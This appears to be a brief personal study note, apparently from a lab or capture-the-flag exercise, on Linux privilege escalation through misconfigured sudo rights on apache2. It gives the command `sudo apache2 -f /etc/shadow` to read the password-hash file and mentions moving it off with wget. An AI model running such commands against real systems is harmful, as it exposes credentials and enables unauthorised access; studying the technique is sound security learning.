Maybe the application does not give root immediately like previously, but there is a **intended functionality of the application that does give us access to something.**

# Identification
---
![[Pasted image 20250428151726.png]]

# Exploitation
---
- `sudo apache2 -f /etc/shadow`
	- `-f`-> File to read
	- ![[Pasted image 20250428151955.png]]
- Using `wget`to transfer the file:
	- ![[Pasted image 20250428152058.png]]